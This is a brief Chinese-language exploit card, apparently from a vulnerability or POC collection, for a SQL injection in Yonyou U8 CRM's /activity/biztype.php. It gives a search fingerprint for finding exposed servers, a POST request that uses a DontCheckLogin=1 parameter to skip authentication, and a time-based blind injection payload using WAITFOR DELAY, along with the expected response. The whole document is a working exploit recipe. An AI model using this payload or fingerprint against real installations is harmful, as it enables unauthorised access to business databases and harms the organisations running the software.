# 用友U8CRMbiztype.phpsql注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`POST /activity/biztype.php?DontCheckLogin=1 HTTP/1.1`

**Payload**
```
actvtID=1%27;WAITFOR+DELAY+%270:0:5%27--
```
- **响应特征**：200